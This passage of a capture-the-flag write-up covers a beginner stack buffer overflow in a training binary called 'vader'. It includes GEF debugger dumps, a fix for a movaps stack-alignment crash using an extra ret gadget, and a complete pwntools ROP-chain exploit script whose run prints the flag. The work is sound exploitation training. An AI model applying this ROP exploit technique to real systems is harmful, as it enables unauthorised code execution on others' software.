   0x7ffff7ec102b <read+11>        syscall 
 → 0x7ffff7ec102d <read+13>        cmp    rax, 0xfffffffffffff000
   0x7ffff7ec1033 <read+19>        ja     0x7ffff7ec1090 <__GI___libc_read+112>
   0x7ffff7ec1035 <read+21>        ret    
   0x7ffff7ec1036 <read+22>        cs     nop WORD PTR [rax+rax*1+0x0]
   0x7ffff7ec1040 <read+32>        sub    rsp, 0x28
   0x7ffff7ec1044 <read+36>        mov    QWORD PTR [rsp+0x18], rdx
 threads ────
[#0] Id 1, Name: "vader", stopped 0x7ffff7ec102d in __GI___libc_read (), reason: STOPPED
 trace ────
[#0] 0x7ffff7ec102d → __GI___libc_read(fd=0x0, buf=0x7ffff7f9bb03 <_IO_2_1_stdin_+131>, nbytes=0x1)
[#1] 0x7ffff7e4b00e → _IO_new_file_underflow(fp=0x7ffff7f9ba80 <_IO_2_1_stdin_>)
[#2] 0x7ffff7e4c002 → __GI__IO_default_uflow(fp=0x7ffff7f9ba80 <_IO_2_1_stdin_>)
[#3] 0x7ffff7e3fe2a → __GI__IO_getline_info(fp=0x7ffff7f9ba80 <_IO_2_1_stdin_>, buf=0x7fffffffde80 "", n=0xff, delim=0xa, extract_delim=0x1, eof=0x0)
[#4] 0x7ffff7e3ff28 → __GI__IO_getline(fp=0x7ffff7f9ba80 <_IO_2_1_stdin_>, buf=0x7fffffffde80 "", n=0xff, delim=0xa, extract_delim=0x1)
[#5] 0x7ffff7e3ef6e → _IO_fgets(buf=0x7fffffffde80 "", n=0x100, fp=0x7ffff7f9ba80 <_IO_2_1_stdin_>)
[#6] 0x4015f3 → main()

Breakpoint 1 at 0x4015f8

Breakpoint 1, 0x00000000004015f8 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
 registers ────
$rax   : 0x0               
$rbx   : 0x007fffffffdfb8  →  0x007fffffffe309  →  0x72656461762f2e ("./vader"?)
$rcx   : 0x007fffffffde80  →  0x4141414141414141 ("AAAAAAAA"?)
$rdx   : 0xfbad208b        
$rsp   : 0x007fffffffde80  →  0x4141414141414141 ("AAAAAAAA"?)
$rbp   : 0x007fffffffdea0  →  0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x007ffff7f9bb03  →  0xf9da20000000000a ("\n"?)
$rdi   : 0x007ffff7f9da20  →  0x0000000000000000
$rip   : 0x000000004015f8  →  <main+67> leave 
$r8    : 0x1               
$r9    : 0x0               
$r10   : 0x007ffff7dd20c0  →  0x00100022000048ef
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x007fffffffdfc8  →  0x007fffffffe311  →  0x5245545f5353454c ("LESS_TER"?)
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
 stack ────
0x007fffffffde80│+0x0000: 0x4141414141414141     ← $rcx, $rsp
0x007fffffffde88│+0x0008: 0x4141414141414141
0x007fffffffde90│+0x0010: 0x4141414141414141
0x007fffffffde98│+0x0018: 0x4141414141414141
0x007fffffffdea0│+0x0020: 0x4141414141414141     ← $rbp
0x007fffffffdea8│+0x0028: 0x0000000040165b  →  <__libc_csu_init+91> pop rdi
0x007fffffffdeb0│+0x0030: 0x00000000402ec9  →  0x443153004b524144 ("DARK"?)
0x007fffffffdeb8│+0x0038: 0x00000000401659  →  <__libc_csu_init+89> pop rsi
 code:x86:64 ────
     0x4015eb <main+54>        mov    rdi, rax
     0x4015ee <main+57>        call   0x401060 <fgets@plt>
     0x4015f3 <main+62>        mov    eax, 0x0
 →   0x4015f8 <main+67>        leave  
     0x4015f9 <main+68>        ret    
     0x4015fa                  nop    WORD PTR [rax+rax*1+0x0]
     0x401600 <__libc_csu_init+0> push   r15
     0x401602 <__libc_csu_init+2> lea    r15, [rip+0x37ff]        # 0x404e08
     0x401609 <__libc_csu_init+9> push   r14
 threads ────
[#0] Id 1, Name: "vader", stopped 0x4015f8 in main (), reason: BREAKPOINT
 trace ────
[#0] 0x4015f8 → main()
```

Now the breakpoint is reached i'll continue the process

```
gef➤  c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e2773b in buffered_vfprintf (s=0x7ffff7f9c760 <_IO_2_1_stdout_>, format=format@entry=0x402eeb "<<< %s\n", args=args@entry=0x7fffffffddb8, mode_flags=mode_flags@entry=0x0) at ./stdio-common/vfprintf-internal.c:1734
1734    ./stdio-common/vfprintf-internal.c: No such file or directory.

[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007fffffffdd78  →  0x000000004062a0  →  0x00000000fbad2488
$rbx   : 0x007ffff7f9c760  →  0x00000000fbad2887
$rcx   : 0x0               
$rdx   : 0x007fffffffddb8  →  0x0000003000000008
$rsp   : 0x007fffffffbc58  →  0x0000000000000000
$rbp   : 0x007fffffffdef8  →  "AAAAAAAA\n"
$rsi   : 0x00000000402eeb  →  "<<< %s\n"
$rdi   : 0x007fffffffbc78  →  0x0000000000000000
$rip   : 0x007ffff7e2773b  →  <buffered_vfprintf+91> movaps XMMWORD PTR [rsp+0x40], xmm0
$r8    : 0x00000000406493  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x1000            
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x007fffffffdfc8  →  0x007fffffffe311  →  0x5245545f5353454c ("LESS_TER"?)
$r14   : 0x0               
$r15   : 0x00000000402ece  →  0x464f0033443153 ("S1D3"?)
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffbc58│+0x0000: 0x0000000000000000     ← $rsp
0x007fffffffbc60│+0x0008: 0x00000000fbad8004
0x007fffffffbc68│+0x0010: 0x0000000000000000
0x007fffffffbc70│+0x0018: 0x0000000000000000
0x007fffffffbc78│+0x0020: 0x0000000000000000     ← $rdi
0x007fffffffbc80│+0x0028: 0x007fffffffbd60  →  "\n\n When I left you, I was but the learner. Now I[...]"
0x007fffffffbc88│+0x0030: 0x007fffffffbda3  →  0x0000000000000000
0x007fffffffbc90│+0x0038: 0x007fffffffdd60  →  0x007ffff7f985e0  →  0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7e27724 <buffered_vfprintf+68> mov    DWORD PTR [rdi+0xc0], 0xffffffff
   0x7ffff7e2772e <buffered_vfprintf+78> lea    rax, [rsp+0x2120]
   0x7ffff7e27736 <buffered_vfprintf+86> lea    rdi, [rsp+0x20]
 → 0x7ffff7e2773b <buffered_vfprintf+91> movaps XMMWORD PTR [rsp+0x40], xmm0
   0x7ffff7e27740 <buffered_vfprintf+96> mov    r12, rsp
   0x7ffff7e27743 <buffered_vfprintf+99> mov    QWORD PTR [rsp+0x50], rax
   0x7ffff7e27748 <buffered_vfprintf+104> mov    eax, DWORD PTR [rbx+0x74]
   0x7ffff7e2774b <buffered_vfprintf+107> mov    QWORD PTR [rsp+0x100], rbx
   0x7ffff7e27753 <buffered_vfprintf+115> mov    DWORD PTR [rsp+0x94], eax
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vader", stopped 0x7ffff7e2773b in buffered_vfprintf (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7e2773b → buffered_vfprintf(s=0x7ffff7f9c760 <_IO_2_1_stdout_>, format=0x402eeb "<<< %s\n", args=0x7fffffffddb8, mode_flags=0x0)
[#1] 0x7ffff7e267f3 → __vfprintf_internal(s=<optimized out>, format=0x402eeb "<<< %s\n", ap=0x7fffffffddb8, mode_flags=0x0)
[#2] 0x7ffff7e1b4fb → __printf(format=<optimized out>)
[#3] 0x401592 → vader()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────'
```

Now looking at the $rip we see this `<buffered_vfprintf+91> movaps XMMWORD PTR [rsp+0x40], xmm0`

So the segfault we're getting is caused by movaps stack alignment 

Using this resource will help [Resource](https://ropemporium.com/guide.html)

So here's the fix for this

```
The solution is to call the ret address of the other func one more time before calling the vader() function when designing the overflow stack, so that the rsp address can be reduced by 8
```

With that lets get the address

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/vader]
└─$ ropper --file vader --search "ret"   
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret

[INFO] File: vader
0x0000000000401072: ret 0x3f; 
0x0000000000401016: ret; 
```

There are two return address but i'll use `0x401016`

Now here't the modified exploit

```
from pwn import *

io = process('./vader')
#gdb.attach(io, gdbscript='b *main+67\nc')

elf = ELF('./vader')
#rop gadgets
pop_rdi = p64(0x40165b)
pop_rsi_pop_15 = p64(0x401659)
pop_rcx_pop_rdx = p64(0x4011cd)
pop_r8 = p64(0x4011d9)

#strings 
DARK = 0x402ec9
S1D3 = 0x402ece
OF = 0x402ed3
TH3 = 0x402ed6
FORC3 = 0x402eda

param1 = p64(DARK) 
param2 = p64(S1D3)
param3 = p64(OF)
param4 = p64(TH3)
param5 = p64(FORC3)

movaps_allign = p64(0x401016)
#final payload
print(io.recvuntil('Now I am the master >>> '))
payload = ""
payload += b"A"*40
payload += pop_rdi 
payload += param1
payload += pop_rsi_pop_15
payload += param2 * 2 #occupy the pop_15 address
payload += pop_rcx_pop_rdx
payload += param4 + param3 #pop OF into rdx, pop TH3 into rcx
payload += pop_r8
payload += param5
payload += movaps_allign
payload += p64(elf.symbols['vader'])

io.sendline(payload)

io.interactive()
```

Now i'll run it again

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/vader]
└─$ python2 exploit.py
[+] Starting local process './vader': pid 164474
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/vader/vader'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
MMMMMMMMMMMMMMMMMMMMMMMMMMMWXKOxdolc;',;;::llclodkOKNWMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMWXOoc;::::::;;;clkKNXxlcccc:::::cdOXWMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMWMMNkc,;clccc;,...    .:c:. ...,;:cccc:,,ckNMWMMMMMMMMMMMMMDARK
MMMMMMMMMMMMMMMMMMXx;;lol:'            .'.           .':loc',xNMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMW0:;dxlcc'            .dO;             .::lxo':0MMMMMMMMMMMMS1D3
MMMMMMMMMMMMMMMWk':Ol;x0c           ';oKK: .            cOo,dk;,OMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMO':Ol:0Xc            l0OXNc.l'            cKO;o0;,KMMMMMMMMMMMMOF
MMMMMMMMMMMMMMX:'Oo:KMd             o0ONWc'x,            .xM0:xk.lWMMMMMMMMMMMMM
MMMMMMMMMMMMMMx.okcOMMk.            o0OWMl'x;            .xMMklOc'OMMMMMMMMMMTH3
MMMMMMMMMMMMMWc'xldWMMWKx'          oOkNMo,x;          'oONMMWdod.oMMMMMMMMMMMMM
MMMMMMMMMMMMMK;:dl0MMMMMXc          lOxNMo'd;          lWMMMMMOld;:NMMMMMMMFORC3
MMMMMMMMMMMMMO':ldWMMMMWo           ckxNMd,d;          .kMMMMMNlc;,KMMMMMMMMMMMM
MMMMMMMMMMMMMk';cxMMMMMWOl:,.       cxxNMx;d;       .,;l0MMMMMWdc;'0MMMMMMMMMMMM
MMMMMMMMMMMMMx',cOMMMWXOxoc;.       cxxNMkcx:       .cdkOXWMMMMd:;'0MMMMMMMMMMMM
MMMMMMMMMMMMMx';;l0xl,.    .       ,0xdWMOcOx.           .,lkXWd:;'OMMMMMMMMMMMM
MMMMMMMMMMMMMd.ld:'    .',;::ccc:;,kWxxWMOlONo',:cc::,'...   'ood:'OMMMMMMMMMMMM
MMMMMMMMMMMMWl.xK:            .';coOXo:xxo:kKkl:;'.           .oXl.OMMMMMMMMMMMM
MMMMMMMMMMMM0';d'       .......',;;''.    ..'',;,'......        lo.lWMMMMMMMMMMM
MMMMMMMMMMMX:,l'        ..      .',:;lo. ;d:;:,..     ..         c:.xWMMMMMMMMMM
MMMMMMMMMMNc,o,                     '0XxoOWd.                    .l:,0MMMMMMMMMM
MMMMMMMMMWd,o;                      .xMNXWWc                      .o::XMMMMMMMMM
MMMMMMMMMk,oc                    .. .kXkdONc ..                    'd;oWMMMMMMMM
MMMMMMMM0;lo.         .;:,'....  'cxxo;'''cxxo:. ......';'          :x:xWMMMMMMM
MMMMMMMK:lx.           'xNNXXXKd;;::,.,l:..':c;,;xKKKXX0l.           oxcOMMMMMMM
MMMMMMXcck,         ..   ,cloool:. .lc,,'.cx, .';looooc.             .kxlKMMMMMM
MMMMMWoc0c      .'. .cdll;..',;lkOxxl:xOOxclddkkl:,''.';:cl'  ..      :KddNMMMMM
MMMMWxc0x.       :o; .xWWKkdodkKWMMKlxWMMMKdOMMWXkdoloONMXc .cc.      .dXdxWMMMM
MMMMOcOK;         'xd.'0MMMMMMMXk0Xc'dKXXKO:,0KkKWMMMMMMWo.;xl.        ,0XxOWMMM
MMM0lkNo           .xO;cXWWMWXd:dx; ;d;,:l:  ;xd:l0WMMMWx,oO;           oWKx0MMM
MMKokW0'            .dKdOWMNx;ckd:. lK,.cOd..lcdO:'oXMMKokO,            .OWKkXMM
MXdxN0;              .kWNWXc.,d;.do lK,.:kd.,0l.;o,.:KWNNK,              ;KW0kNM
NxdOc.                ,0MMd..;l''Oo lK,.;kd.;Ko .,,. lWMXc                'xXOOW
xd0d.                  ;KMO,.c0ocXk;xXocxK0cdNOcol'''dWWd.                 .o0kO
,xWX:                   :XXc.:oddxxxxxxddxxxxkkOko;.:KNd.                  'kN0l
.,dOkdoc:,'..            .'..,lxkox0OO0kxOOxOOddxl,..,,.              ..,:lkKOl.
x,...',;:cc::;,,'''...        .,;cdO0KKKXXKkdo:,,'.        ...'',,,,;;clllc;'..;
MNKOxdoolcc::;;;;. ..             ..,;:clc;..              ...,;;;,,'',;;:clox0N
MMMMMMMMMMMMMMMMW0;                                          'kKXXNNNWWMMMMMMMMM
MMMMMMMMMMMMMMMMMMNd,..          ........                .. .kWMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMWKxl;..       'okOOko:,..     ..  ....';lKWMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMXkdc'....   .,cc:,,'..  .'o0Oo:;:cokXMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMWXkdoc;''''',,;;:::::::ccllclx0NMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMWXkol:;,'.''''....,cokKWMMMMMMMMMMMMMMMMMMMMMMMMMMMM


 When I left you, I was but the learner. Now I am the master >>> 
[*] Switching to interactive mode
[*] Process './vader' stopped with exit code 1 (pid 164474)
<<< FLAG{Y0U_PWN3D_M3}

[*] Got EOF while reading in interactive
$ 
[*] Got EOF while sending in interactive
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/vader]
└─$ 
```

Nice it worked xD

And we're done 

<br> <br>
[Back To Home](../../index.md)

                   
